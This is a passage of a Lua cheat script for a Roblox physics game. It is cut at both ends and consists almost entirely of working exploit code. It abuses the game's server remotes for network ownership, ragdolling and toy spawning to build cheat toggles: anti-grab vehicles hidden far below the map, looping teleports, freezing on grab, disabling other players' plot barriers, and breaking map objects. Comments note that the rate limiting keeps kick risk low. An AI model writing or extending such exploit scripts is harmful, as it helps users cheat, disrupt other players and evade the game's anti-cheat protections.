                    end
                    local diddy = itm.VehicleSeat
                    diddy.Parent = nil
                    diddy.Parent = itm
                    if not checkgrab(itm) and (hrp.CFrame.Position - (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')).CFrame.Position).Magnitude < 28 then
                        for _, prt in pairs(itm:GetChildren())do
                            if prt:IsA('BasePart') and prt.CanQuery then
                                KozRemote.SetNetworkOwner:FireServer(prt, CFrame.lookAt(hrp.CFrame.Position, prt.CFrame.Position))
                            end
                        end
                    end
                    if not hum.SeatPart then
                        hum.Sit = false
                    else
                        wait = false
                        task.wait()
                    end
                    if hrp and hum and (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant == hum) then
                        local ragdolled = hum:FindFirstChild('Ragdolled')
                        if ragdolled and ragdolled.Value then
                            guccion = false
                        end
                        if itm.VehicleSeat.Occupant == hum then
                            guccion = true
                        elseif not guccion then
                            task.wait()
                            wait = false
                            if (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant == hum) then
                                local ragdolled2 = hum:FindFirstChild('Ragdolled')
                                if not ragdolled2 or not ragdolled2.Value then
                                    itm.VehicleSeat:Sit(hum)
                                    KozRemote.RagdollRemote:FireServer(hrp, 0.016)
                                end
                            end
                        end
                        if guccion then
                            if gucciMode == "Blobman Breaked" then
                                removeGucciItem(itm, true)
                                itm = nil
                                break
                            else
                                (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')).AssemblyLinearVelocity = selectedGucciType == 'CreatureBlobman' and Vector3.new(0, 1e15, 0) or Vector3.zero
                            end
                        else
                            local ping = 50
                            pcall(function() ping = game:GetService("Stats").Network.ServerStatsItem['Data Ping']:GetValue() end)
                            if (inexistance[itm] or 0) >= ping / 250 then
                                if not preserveGucciBlobman(itm) then
                                    removeGucciItem(itm)
                                    itm = nil
                                end
                                hum.Sit = true
                            end
                        end
                    end
                else
                    if guccion then
                        hum.Sit = true
                    end
                    guccion = false
                    if (inexistance[itm] or 0) >= 1 then
                        if not preserveGucciBlobman(itm) then
                            removeGucciItem(itm)
                            itm = nil
                            triggerGucciSpawn()
                        else
                            inexistance[itm] = 0
                        end
                    end
                end
            else
                if guccion then
                    guccion = false
                    hum.Sit = true
                end
                triggerGucciSpawn()
            end
            if wait then
                task.wait()
                hum.Sit = false
            end
        else
            task.wait()
        end
    end
    gucciRunning = false
end
local function onCharacterAdded(char)
    if not GUE then
        return
    end
    -- Immediately remove any leftover Gucci item
    pcall(function()
        if itm and itm.Parent then
            removeGucciItem(itm, true)
        end
        local toyFolder = KozWS:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
        if toyFolder then
            for _, toy in ipairs(toyFolder:GetChildren()) do
                if toy.Name == selectedGucciType or toy.Name == "CreatureBlobman" or toy.Name == "SantaSleigh" or toy.Name == "TractorGreen" then
                    removeGucciItem(toy, true)
                end
            end
        end
    end)
    itm = nil
    inexistance = {}
    humconnection = nil
    sp = nil
    sv = nil
    gucciRunning = false
    task.spawn(function()
        char:WaitForChild("Humanoid", 10)
        local root = char:WaitForChild("HumanoidRootPart", 10)
        hum, hrp = getCharParts()
        if not hum or not root then return end
        if not GUE then return end
        -- Spawn and sit immediately on respawn without 0.5s delay for top priority
        task.spawn(gucciblob)
    end)
end
if characterAddedConnection then
    characterAddedConnection:Disconnect()
end
characterAddedConnection = KozPLR.CharacterAdded:Connect(onCharacterAdded)
function gucciBlobmanSet(state)
    KozFlags.GucciAntiGrab = state
    GUE = state
    if state then
        gucciRunning = false
        task.spawn(gucciblob)
    else
        gucciRunning = false
        if itm and itm.Parent then
            removeGucciItem(itm, true)
        end
        local toyFolder = KozWS:FindFirstChild(KozPLR.Name .. 'SpawnedInToys')
        if toyFolder and (selectedGucciType == 'CreatureBlobman' or selectedGucciType == 'SantaSleigh') then
            for _, toy in ipairs(toyFolder:GetChildren()) do
                if toy.Name == selectedGucciType then
                    removeGucciItem(toy, true)
                end
            end
        end
        itm = nil
        inexistance = {}
    end
end
function gucciBlobTypeSet(name)
    selectedGucciType = gucciTypes[name] or 'CreatureBlobman'
end
end)()

gucciMode = "Blobman"
gucciActive = false
gucciTask = nil
local function gucciStop()
    gucciActive = false
    if gucciTask then
        task.cancel(gucciTask)
        gucciTask = nil
    end
end
local function gucciSitToggle(hum)
    if not hum then return end
    task.spawn(function()
        for _ = 1, 30 do
            hum.Sit = true
            task.wait()
            hum.Sit = false
        end
    end)
end
local function gucciTractorStart()
    local char = KozPLR.Character or KozPLR.CharacterAdded:Wait()
    local hum = char:WaitForChild("Humanoid", 5)
    local hrp = char:WaitForChild("HumanoidRootPart", 5)
    if not hum or not hrp then return end
    pcall(function()
        local pal
        local conn
        conn = KozPLR.PlayerGui.MenuGui.Menu.TabContents.ToyDestroy.Contents.ChildAdded:Connect(function(c)
            if c.Name == "TractorGreen" then
                pal = c
                task.wait()
                conn:Disconnect()
            end
        end)
        task.spawn(function()
            task.wait(1)
            if pal and pal:FindFirstChild("ViewItemButton") then
                local mess = pal.ViewItemButton.NewMessage:Clone()
                mess.Name = "Gucci2"
                mess.TextColor3 = Color3.fromRGB(255, 255, 255)
                mess.Text = "Anti Gucci"
                mess.Visible = true
                mess.Parent = pal.ViewItemButton
            end
        end)
    end)
    local inv = KozWS:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
    if inv and inv:FindFirstChild("tractorgucci") then
        pcall(function() KozDisp:Fire(KozRemote.DestroyToy, inv.tractorgucci) end)
    end
    local blobb = nil
    local conn
    if inv then
        conn = inv.ChildAdded:Connect(function(child)
            if child.Name == "TractorGreen" and child:IsA("Model") then
                blobb = child
                if conn then conn:Disconnect() end
            end
        end)
    end
    task.spawn(function()
        pcall(function() KozDisp:Invoke(KozRemote.SpawnToyRemoteFunction, "TractorGreen", hrp.CFrame * CFrame.new(0, -1, 13), Vector3.new(0, 0, 0)) end)
    end)
    local startTick = tick()
    while not blobb do
        if tick() - startTick > 5 then break end
        task.wait()
    end
    if conn then conn:Disconnect() end
    if not blobb then return end
    blobb.Name = "tractorgucci"
    local seat = blobb:WaitForChild("VehicleSeat", 3)
    if not seat then return end
    pcall(function() seat:Sit(hum) end)
    task.spawn(function()
        local endTime = tick() + 3
        while tick() < endTime do
            pcall(function() KozDisp:Fire(KozRemote.RagdollRemote, hrp, 0) end)
            task.wait()
        end
    end)
    task.wait()
    while seat.Occupant ~= hum do task.wait() end
    pcall(function() hum:ChangeState(Enum.HumanoidStateType.Jumping) end)
    local mainPart = blobb:FindFirstChild("Part") or blobb.PrimaryPart
    if mainPart then
        pcall(function() KozDisp:Fire(KozRemote.SetNetworkOwner, mainPart, mainPart.CFrame) end)
    end
    task.wait(0.2)
    pcall(function() seat.CFrame = CFrame.new(0, -10000, 0) end)
    local function getTractorParts()
        local parts = {}
        local function collectParts(model)
            for _, child in pairs(model:GetChildren()) do
                if child:IsA("BasePart") then
                    pcall(function() child.CanCollide = false end)
                    table.insert(parts, child)
                end
                if child:IsA("Model") then
                    collectParts(child)
                end
            end
        end
        collectParts(blobb)
        return parts
    end
    while gucciActive do
        if not blobb or not blobb.Parent then
            local inv2 = KozWS:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
            blobb = inv2 and (inv2:FindFirstChild("tractorgucci") or inv2:FindFirstChild("TractorGreen"))
            if not blobb then
                local curChar = KozPLR.Character
                local curRoot = curChar and curChar:FindFirstChild("HumanoidRootPart")
                local spawnCFrame = (curRoot and curRoot.CFrame or hrp.CFrame) * CFrame.new(0, -1, 13)
                local conn2
                if inv2 then
                    conn2 = inv2.ChildAdded:Connect(function(child)
                        if child.Name == "TractorGreen" and child:IsA("Model") then
                            blobb = child
                            if conn2 then conn2:Disconnect() end
                        end
                    end)
                end
                task.spawn(function()
                    pcall(function() KozDisp:Invoke(KozRemote.SpawnToyRemoteFunction, "TractorGreen", spawnCFrame, Vector3.new(0, 0, 0)) end)
                end)
                local startTick2 = tick()
                while not blobb do
                    if tick() - startTick2 > 5 then break end
                    task.wait()
                end
                if conn2 then conn2:Disconnect() end
                if blobb then blobb.Name = "tractorgucci" end
            end
        end
        if blobb then
            local curChar = KozPLR.Character
            local curRoot = curChar and curChar:FindFirstChild("HumanoidRootPart")
            if curRoot then
                local myPos = curRoot.Position
                for _, prt in ipairs(getTractorParts()) do
                    if prt.Parent and (prt.Position - myPos).Magnitude <= 22 then
                        pcall(function() KozDisp:Fire(KozRemote.SetNetworkOwner, prt, prt.CFrame) end)
                    end
                    pcall(function() prt.AssemblyLinearVelocity = Vector3.new(0, 1400, 0) end)
                end
            end
        end
        task.wait(0.02)
    end
end
local function gucciTractorStop()
    task.spawn(function()
        local inv = KozWS:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
        if inv and inv:FindFirstChild("tractorgucci") then
            pcall(function() KozDisp:Fire(KozRemote.DestroyToy, inv:FindFirstChild("tractorgucci")) end)
        end
        local char = KozPLR.Character
        local hum = char and char:FindFirstChild("Humanoid")
        gucciSitToggle(hum)
    end)
end
local function gucciTrainStart()
    local char = KozPLR.Character or KozPLR.CharacterAdded:Wait()
    local hum = char:WaitForChild("Humanoid", 5)
    local hrp = char:WaitForChild("HumanoidRootPart", 5)
    if not hum or not hrp then return end
    local seat = KozWS.Map.AlwaysHereTweenedObjects.Train.Object.ObjectModel.Seat
    if not seat then return end
    local pos = hrp.CFrame
    pcall(function() seat:Sit(hum) end)
    task.spawn(function()
        local endTime = tick() + 3
        while tick() < endTime do
            pcall(function() KozDisp:Fire(KozRemote.RagdollRemote, hrp, 0) end)
            task.wait()
        end
    end)
    task.wait(0.2)
    pcall(function() hum:ChangeState(Enum.HumanoidStateType.Jumping) end)
    task.wait(0.2)
    pcall(function() hrp.CFrame = pos end)
end
local function gucciTrainStop()
    local char = KozPLR.Character
    local hum = char and char:FindFirstChild("Humanoid")
    gucciSitToggle(hum)
end
local function gucciSantaStart()
    local char = KozPLR.Character or KozPLR.CharacterAdded:Wait()
    local hum = char:WaitForChild("Humanoid", 5)
    local hrp = char:WaitForChild("HumanoidRootPart", 5)
    if not hum or not hrp then return end
    pcall(function()
        local pal
        local conn
        conn = KozPLR.PlayerGui.MenuGui.Menu.TabContents.ToyDestroy.Contents.ChildAdded:Connect(function(c)
            if c.Name == "SantaSleigh" then
                pal = c
                task.wait()
                conn:Disconnect()
            end
        end)
        task.spawn(function()
            task.wait(1)
            if pal and pal:FindFirstChild("ViewItemButton") then
                local mess = pal.ViewItemButton.NewMessage:Clone()
                mess.Name = "Gucci3"
                mess.TextColor3 = Color3.fromRGB(255, 255, 255)
                mess.Text = "Anti Gucci"
                mess.Visible = true
                mess.Parent = pal.ViewItemButton
            end
        end)
    end)
    local inv = KozWS:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
    if inv and inv:FindFirstChild("santagucci") then
        pcall(function() KozDisp:Fire(KozRemote.DestroyToy, inv.santagucci) end)
    end
    local blobb = nil
    local conn
    if inv then
        conn = inv.ChildAdded:Connect(function(child)
            if child.Name == "SantaSleigh" and child:IsA("Model") then
                blobb = child
                if conn then conn:Disconnect() end
            end
        end)
    end
    task.spawn(function()
        pcall(function() KozDisp:Invoke(KozRemote.SpawnToyRemoteFunction, "SantaSleigh", hrp.CFrame * CFrame.new(0, -1, 13), Vector3.new(0, 0, 0)) end)
    end)
    local startTick = tick()
    while not blobb do
        if tick() - startTick > 5 then break end
        task.wait()
    end
    if conn then conn:Disconnect() end
    if not blobb then return end
    blobb.Name = "santagucci"
    local seat = blobb:WaitForChild("VehicleSeat", 3)
    if not seat then return end
    pcall(function() seat:Sit(hum) end)
    task.spawn(function()
        local endTime = tick() + 3
        while tick() < endTime do
            pcall(function() KozDisp:Fire(KozRemote.RagdollRemote, hrp, 0) end)
            task.wait()
        end
    end)
    task.wait()
    while seat.Occupant ~= hum do task.wait() end
    pcall(function() hum:ChangeState(Enum.HumanoidStateType.Jumping) end)
    local mainPart = blobb:FindFirstChild("Part") or blobb.PrimaryPart
    if mainPart then
        pcall(function() KozDisp:Fire(KozRemote.SetNetworkOwner, mainPart, mainPart.CFrame) end)
    end
    task.wait(0.2)
    pcall(function() seat.CFrame = CFrame.new(0, -10000, 0) end)
    local function getSantaParts()
        local parts = {}
        local function collectParts(model)
            for _, child in pairs(model:GetChildren()) do
                if child:IsA("BasePart") then
                    pcall(function() child.CanCollide = false end)
                    table.insert(parts, child)
                end
                if child:IsA("Model") then
                    collectParts(child)
                end
            end
        end
        collectParts(blobb)
        return parts
    end
    while gucciActive do
        if not blobb or not blobb.Parent then
            local inv2 = KozWS:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
            blobb = inv2 and (inv2:FindFirstChild("santagucci") or inv2:FindFirstChild("SantaSleigh"))
            if not blobb then
                local curChar = KozPLR.Character
                local curRoot = curChar and curChar:FindFirstChild("HumanoidRootPart")
                local spawnCFrame = (curRoot and curRoot.CFrame or hrp.CFrame) * CFrame.new(0, -1, 13)
                local conn2
                if inv2 then
                    conn2 = inv2.ChildAdded:Connect(function(child)
                        if child.Name == "SantaSleigh" and child:IsA("Model") then
                            blobb = child
                            if conn2 then conn2:Disconnect() end
                        end
                    end)
                end
                task.spawn(function()
                    pcall(function() KozDisp:Invoke(KozRemote.SpawnToyRemoteFunction, "SantaSleigh", spawnCFrame, Vector3.new(0, 0, 0)) end)
                end)
                local startTick2 = tick()
                while not blobb do
                    if tick() - startTick2 > 5 then break end
                    task.wait()
                end
                if conn2 then conn2:Disconnect() end
                if blobb then blobb.Name = "santagucci" end
            end
        end
        if blobb then
            local curChar = KozPLR.Character
            local curRoot = curChar and curChar:FindFirstChild("HumanoidRootPart")
            if curRoot then
                local myPos = curRoot.Position
                for _, prt in ipairs(getSantaParts()) do
                    if prt.Parent and (prt.Position - myPos).Magnitude <= 22 then
                        pcall(function() KozDisp:Fire(KozRemote.SetNetworkOwner, prt, prt.CFrame) end)
                    end
                    pcall(function() prt.AssemblyLinearVelocity = Vector3.new(0, 1400, 0) end)
                end
            end
        end
        task.wait(0.02)
    end
end
local function gucciSantaStop()
    task.spawn(function()
        local inv = KozWS:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
        if inv and inv:FindFirstChild("santagucci") then
            pcall(function() KozDisp:Fire(KozRemote.DestroyToy, inv:FindFirstChild("santagucci")) end)
        end
        local char = KozPLR.Character
        local hum = char and char:FindFirstChild("Humanoid")
        gucciSitToggle(hum)
    end)
end
local function gucciStart()
    gucciActive = true
    if gucciMode == "Tractor (Invisible)" then
        gucciTask = task.spawn(gucciTractorStart)
    elseif gucciMode == "Train (Invisible)" then
        gucciTask = task.spawn(gucciTrainStart)
    elseif gucciMode == "Santa (Invisible)" then
        gucciTask = task.spawn(gucciSantaStart)
    else
        pcall(function()
            gucciBlobTypeSet(gucciMode)
            gucciBlobmanSet(true)
        end)
    end
end
local function gucciApply(state)
    if state then
        if gucciActive then
            if gucciMode == "Tractor (Invisible)" then
                gucciTractorStop()
            elseif gucciMode == "Train (Invisible)" then
                gucciTrainStop()
            elseif gucciMode == "Santa (Invisible)" then
                gucciSantaStop()
            else
                pcall(function() gucciBlobmanSet(false) end)
            end
        end
        gucciStop()
        gucciStart()
    else
        if gucciActive then
            if gucciMode == "Tractor (Invisible)" then
                gucciTractorStop()
            elseif gucciMode == "Train (Invisible)" then
                gucciTrainStop()
            elseif gucciMode == "Santa (Invisible)" then
                gucciSantaStop()
            else
                pcall(function() gucciBlobmanSet(false) end)
            end
        end
        gucciStop()
    end
end

GucciDefense:AddDropdown("GucciMode", {
    Text = "Gucci",
    Values = {
        "Blobman",
        "Blobman Breaked",
        "Santa Sleigh",
        "Tractor (Invisible)",
        "Train (Invisible)",
        "Santa (Invisible)",
    },
    Default = "Blobman",
    Callback = function(v)
        if typeof(v) == "table" then
            v = v[1] or v.Blobman or "Blobman"
        end
        gucciMode = v
        pcall(function() gucciBlobTypeSet(v) end)
        if gucciActive then
            gucciApply(false)
            task.wait(0.05)
            gucciApply(true)
        end
    end
})

GucciDefense:AddToggle("ApplyGucci", {
    Text = "Apply Gucci",
    Default = false,
    Callback = function(v)
        KozFlags.ApplyGucci = v
        SaveToggleState("ApplyGucci", v)
        gucciApply(v)
    end
})

ExtraDefense = Tabs.DefenseTab:AddLeftGroupbox("Extra Defense")
ExtraDefense:AddLabel("Teleport Defenses", true, Color3.fromRGB(100, 200, 255))

ExtraDefense:AddToggle("LoopTp", {
    Text = "Loop TP",
    Default = false,
    Callback = function(v)
        getgenv().LoopTpEnabled = v
        pos = plr.Character.HumanoidRootPart.CFrame
        if v then
            task.spawn(function()
                while getgenv().LoopTpEnabled and task.wait(0.05) do
                    hrp = plr.Character.HumanoidRootPart
                    hrp.CFrame = pos * CFrame.new(math.random(-1000, 1000), 0, math.random(-1000, 1000))
                    stvel(hrp)
                end
            end)
        else
            stvel(plr.Character.HumanoidRootPart)
            task.wait(0.1)
            plr.Character.HumanoidRootPart.CFrame = pos
        end
    end
})

Players = game:GetService("Players")
player = Players.LocalPlayer
hkSalmonList = {}
hkExpectDeath = false

hkSalmonList = {}
hkExpectDeath = false

local function hkApplySalmon(char)
    if not char then
        return
    end
    newHum = char:WaitForChild('Humanoid', 5)
    if not newHum then
        return
    end
    if hkSalmonList[player.UserId] and not hkExpectDeath then
        hkExpectDeath = true
        grabParts = workspace:FindFirstChild('GrabParts')
        savedGrab = grabParts and grabParts:Clone()
        newHum:ChangeState(Enum.HumanoidStateType.Dead)
        if savedGrab then
            task.delay(0.1, function()
                if not workspace:FindFirstChild('GrabParts') and savedGrab and savedGrab.Parent == nil then
                    savedGrab.Parent = workspace
                end
            end)
        end
    else
        hkExpectDeath = false
    end
end

ExtraDefense:AddToggle("HKAntiKick", {
    Text = "Auto Break PCLD [Reset]",
    Default = true,
    Callback = function(Value)
        hkSalmonList[player.UserId] = Value and true or nil
        if Value and player.Character and not workspace:FindFirstChild('GrabParts') then
            task.spawn(function()
                hkApplySalmon(player.Character)
            end)
        end
    end
})

if player.Character then
    task.spawn(function()
        if hkSalmonList[player.UserId] and not workspace:FindFirstChild('GrabParts') then
            hkApplySalmon(player.Character)
        end
    end)
end

player.CharacterAdded:Connect(function(char)
    if hkSalmonList[player.UserId] then
        hkApplySalmon(char)
    end
end)

ExtraDefense:AddToggle("AntiOwnership", {
    Text = "Anti Ownership (freeze)",
    Default = false,
    Callback = function(v)
        getgenv().AntiOwnershipActive = v
        if v then
            task.spawn(function()
                Struggle = game:GetService("ReplicatedStorage"):WaitForChild("CharacterEvents"):WaitForChild("Struggle")
                while getgenv().AntiOwnershipActive do
                    char = plr.Character
                    if char and char:FindFirstChild("Head") then
                        head = char.Head
                        if head:FindFirstChild("PartOwner") then
                            Struggle:FireServer(plr)
                            for _, part in pairs(char:GetChildren()) do
                                if part:IsA("BasePart") then
                                    part.Anchored = true
                                end
                            end
                            isHeld = plr:FindFirstChild("IsHeld")
                            while isHeld and isHeld.Value and getgenv().AntiOwnershipActive do
                                task.wait()
                            end
                            for _, part in pairs(char:GetChildren()) do
                                if part:IsA("BasePart") then
                                    part.Anchored = false
                                end
                            end
                        end
                    end
                    task.wait(0.1)
                end
            end)
        else
            char = plr.Character
            if char then
                for _, part in pairs(char:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.Anchored = false
                    end
                end
            end
        end
    end
})

ExtraDefense:AddDivider()

-- =====================================================================
-- [KOZMOZ PORT] Anti Ownership + Anti Ownership 2 (PNG 1)
-- musa(4) 7275-7350 - kozmoz'daki "Anti Ownership (freeze)" satirinin
-- hemen altina eklendi. (KozDisp hizi sinirladigi icin kick riski dusuk.)
-- =====================================================================
ExtraDefense:AddToggle("KozAntiOwnership", {
    Text = "Anti Ownership",
    Default = false,
    Callback = function(v)
        KozFlags.AntiOwnership = v
        if not v then KozDisp:Flush() end
        if v then
            KozState.antiOwnershipConns["task"] = task.spawn(function()
                pcall(function()
                    local Struggle = KozRS:WaitForChild("CharacterEvents"):WaitForChild("Struggle")
                    while KozFlags.AntiOwnership do
                        task.wait(0.1)
                        if not KozUtil.isLocalAlive() then continue end
                        local character = KozPLR.Character
                        if character and character:FindFirstChild("Head") then
                            local head = character.Head
                            if head:FindFirstChild("PartOwner") then
                                KozDisp:Fire(Struggle, KozPLR)
                                for _, part in pairs(character:GetChildren()) do
                                    if part:IsA("BasePart") then pcall(function() part.Anchored = true end) end
                                end
                                local isHeld = KozPLR:FindFirstChild("IsHeld")
                                while isHeld and isHeld.Value and KozFlags.AntiOwnership and KozUtil.isLocalAlive() do task.wait(0.05) end
                                for _, part in pairs(character:GetChildren()) do
                                    if part:IsA("BasePart") then pcall(function() part.Anchored = false end) end
                                end
                            end
                        end
                    end
                end)
            end)
        else
            if KozState.antiOwnershipConns["task"] then task.cancel(KozState.antiOwnershipConns["task"]) KozState.antiOwnershipConns["task"] = nil end
            local char = KozPLR.Character
            if char then
                for _, part in pairs(char:GetChildren()) do
                    if part:IsA("BasePart") then pcall(function() part.Anchored = false end) end
                end
            end
        end
    end
})

ExtraDefense:AddToggle("KozAntiOwnership2", {
    Text = "Anti Ownership 2",
    Default = false,
    Callback = function(v)
        KozFlags.AntiOwnership2 = v
        if not v then KozDisp:Flush() end
        if v then
            pcall(function()
                local plr = KozPLR
                local isHeld = plr:WaitForChild("IsHeld", 10)
                if not isHeld then warn("Anti Ownership 2: IsHeld not found") return end
                local kozRemoteLocalStruggle = KozRS:WaitForChild("CharacterEvents"):WaitForChild("Struggle")
                local savedCFrame = nil
                KozState.antiOwnershipConns["AntiOwn2Conn"] = isHeld.Changed:Connect(function(heldState)
                    if not KozUtil.isLocalAlive() then return end
                    local char = plr.Character
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    if heldState then
                        if hrp then savedCFrame = hrp.CFrame pcall(function() hrp.Anchored = true end) end
                        KozState.antiOwnershipConns["AntiOwn2Task"] = task.spawn(function()
                            while isHeld and isHeld.Value and KozFlags.AntiOwnership2 and KozUtil.isLocalAlive() do
                                KozDisp:Fire(KozRemote.Struggle, plr)
                                task.wait(0.05)
                            end
                            if hrp and hrp.Parent then
                                pcall(function() hrp.Anchored = false end)
                                if savedCFrame and KozUtil.isLocalAlive() then pcall(function() hrp.CFrame = savedCFrame end) end
                            end
                        end)
                    else
                        if hrp and hrp.Parent then
                            pcall(function() hrp.Anchored = false end)
                            if savedCFrame and KozUtil.isLocalAlive() then pcall(function() hrp.CFrame = savedCFrame end) end
                        end
                    end
                end)
                KozState.antiOwnershipConns["AntiOwn2CharConn"] = plr.CharacterAdded:Connect(function(char)
                    savedCFrame = nil
                    task.wait(0.6)
                    if KozUtil.isLocalAlive() then
                        pcall(function()
                            local hrp = char:WaitForChild("HumanoidRootPart", 5)
                            if hrp then savedCFrame = hrp.CFrame end
                        end)
                    end
                end)
                if isHeld.Value then
                    local char = plr.Character
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    if hrp then savedCFrame = hrp.CFrame pcall(function() hrp.Anchored = true end) end
                    KozState.antiOwnershipConns["AntiOwn2Task"] = task.spawn(function()
                        while isHeld and isHeld.Value and KozFlags.AntiOwnership2 do
                            KozDisp:Fire(KozRemote.Struggle, plr)
                            task.wait(0.05)
                        end
                        if hrp and hrp.Parent then
                            pcall(function() hrp.Anchored = false end)
                            if savedCFrame then pcall(function() hrp.CFrame = savedCFrame end) end
                        end
                    end)
                end
            end)
        else
            if KozState.antiOwnershipConns["AntiOwn2Conn"] then pcall(function() KozState.antiOwnershipConns["AntiOwn2Conn"]:Disconnect() end) KozState.antiOwnershipConns["AntiOwn2Conn"] = nil end
            if KozState.antiOwnershipConns["AntiOwn2Task"] then task.cancel(KozState.antiOwnershipConns["AntiOwn2Task"]) KozState.antiOwnershipConns["AntiOwn2Task"] = nil end
            if KozState.antiOwnershipConns["AntiOwn2CharConn"] then pcall(function() KozState.antiOwnershipConns["AntiOwn2CharConn"]:Disconnect() end) KozState.antiOwnershipConns["AntiOwn2CharConn"] = nil end
            local char = KozPLR.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if hrp then pcall(function() hrp.Anchored = false end) end
        end
    end
})

ExtraDefense:AddDivider()

ExtraDefense:AddLabel("Lag Control", true, Color3.fromRGB(150, 150, 255))

ExtraDefense:AddToggle("AntiLag", {
    Text = "Anti Lag",
    Default = false,
    Callback = function(v)
        pcall(function()
            plr.PlayerScripts.CharacterAndBeamMove.Enabled = not v
        end)
    end
})

ExtraDefense:AddToggle("AutoAntiLag", {
    Text = "Auto Anti Lag",
    Default = false,
    Callback = function(v)
        getgenv().AutoAntiLag = v
        if v then
            task.spawn(function()
                while getgenv().AutoAntiLag and task.wait() do
                    if Lines > 100 then
                        pcall(function()
                            plr.PlayerScripts.CharacterAndBeamMove.Enabled = false
                        end)
                        Lines = 0
                    end
                end
            end)
        else
            pcall(function()
                plr.PlayerScripts.CharacterAndBeamMove.Enabled = true
            end)
        end
    end
})

ExtraDefense:AddToggle("AntiSticky", {
    Text = "Anti Sticky",
    Default = false,
    Callback = function(v)
        pcall(function()
            plr.PlayerScripts.StickyPartsTouchDetection.Enabled = not v
        end)
    end
})

ExtraDefense:AddDivider()

ExtraDefense:AddLabel("Fun / Utility", true, Color3.fromRGB(200, 150, 255))

ExtraDefense:AddButton({
    Text = "Bring Train",
    Func = function()
        char = plr.Character
        if not char then return end
        hrp = char:FindFirstChild("HumanoidRootPart")
        hum = char:FindFirstChild("Humanoid")
        if not hrp or not hum then return end
        pos = hrp.CFrame
        burger = spawntoy("FoodHamburger", hrp.CFrame)
        repeat task.wait() until burger and burger:FindFirstChild("HoldPart")
        workspace.Map.AlwaysHereTweenedObjects.Train.Object.ObjectModel.Seat:Sit(hum)
        workspace.Map.AlwaysHereTweenedObjects.Train.Object.FollowThisPart.AlignPosition.Enabled = false
        workspace.Map.AlwaysHereTweenedObjects.Train.Object.FollowThisPart.AlignOrientation.Enabled = false
        task.wait(0.1)
        burger.HoldPart.HoldItemRemoteFunction:InvokeServer(burger, char)
        task.wait(0.1)
        functions.DestroyToy:FireServer(inv:FindFirstChild("FoodHamburger") or burger)
        hrp.CFrame = pos * CFrame.new(0, 5, 0)
    end
})

ExtraDefense:AddButton({
    Text = "Delete Legs",
    Func = function()
        char = plr.Character
        if not char then return end
        if char:FindFirstChild("Left Leg") and char:FindFirstChild("Right Leg") then
            ll = char:FindFirstChild("Left Leg")
            rl = char:FindFirstChild("Right Leg")
            void = workspace.FallenPartsDestroyHeight
            torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
            if not torso then return end
            pos = torso.CFrame
            workspace.FallenPartsDestroyHeight = -100
            functions.Ragdoll:FireServer(char.HumanoidRootPart, 2)
            task.wait(0.5)
            rl.CFrame = CFrame.new(0, -10000, 0)
            ll.CFrame = CFrame.new(0, -10000, 0)
            task.wait(0.3)
            torso.CFrame = CFrame.new(0, -9970, 0)
            task.wait(0.5)
            torso.CFrame = pos
            task.wait(0.5)
            workspace.FallenPartsDestroyHeight = void
            task.spawn(function()
                if not char:FindFirstChild("Left Leg") and not char:FindFirstChild("Right Leg") then
                    while task.wait() do
                        if plr.PlayerGui.ControlsGui.PCFrame.Stand.Visible == false then
                            char.Humanoid.HipHeight = 2
                        else
                            char.Humanoid.HipHeight = 0
                        end
                    end
                end
            end)
        end
    end
})

ExtraDefense:AddButton({
    Text = "Ragdoll Once",
    Func = function()
        functions.Ragdoll:FireServer(plr.Character.HumanoidRootPart, 1)
    end
})

ExtraDefense:AddToggle("AntiBarrier", {
    Text = "Anti Barrier",
    Default = false,
    Callback = function(val)
        plots = workspace:FindFirstChild("Plots")
        if not plots then return end
        for _, plot in ipairs(plots:GetChildren()) do
            barrierModel = plot:FindFirstChild("Barrier")
            if barrierModel then
                for _, part in ipairs(barrierModel:GetChildren()) do
                    if part:IsA("BasePart") and part.Name == "PlotBarrier" then
                        part.CanCollide = not val
                    end
                end
            end
        end
    end
})

ExtraDefense:AddToggle("UFOShurikenStick", {
    Text = "break UFO 1 (shuriken)",
    Default = false,
    Callback = function(state)
        if not state then return end
        Players = game:GetService("Players")
        RS = game:GetService("ReplicatedStorage")
        LocalPlayer = Players.LocalPlayer
        PlayerName = LocalPlayer.Name
        StickyEvent = RS:WaitForChild("PlayerEvents"):WaitForChild("StickyPartEvent")
        SpawnRemote = RS.MenuToys:WaitForChild("SpawnToyRemoteFunction")
        CanSpawn = LocalPlayer:WaitForChild("CanSpawnToy")
        ToysFolder = workspace:WaitForChild(PlayerName .. "SpawnedInToys")
        UFOs = {
            workspace.Map.AlwaysHereTweenedObjects:FindFirstChild("InnerUFO"),
            workspace.Map.AlwaysHereTweenedObjects:FindFirstChild("OuterUFO")
        }
        local function getHRP()
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                return LocalPlayer.Character.HumanoidRootPart
            end
            return LocalPlayer.CharacterAdded:Wait():WaitForChild("HumanoidRootPart")
        end
        task.spawn(function()
            for i = 1, 12 do
                t = tick()
                while not CanSpawn.Value do
                    if tick() - t > 5 then break end
                    task.wait(0.1)
                end
                hrp = getHRP()
                if hrp then
                    pcall(function()
                        SpawnRemote:InvokeServer("NinjaShuriken", hrp.CFrame * CFrame.new(0, 10, 15), Vector3.new())
                    end)
                end
                task.wait(0.15)
            end
            task.wait(1)
            for _, Toy in ipairs(ToysFolder:GetChildren()) do
                if Toy.Name == "NinjaShuriken" and Toy:FindFirstChild("StickyPart") then
                    for _, UFO in ipairs(UFOs) do
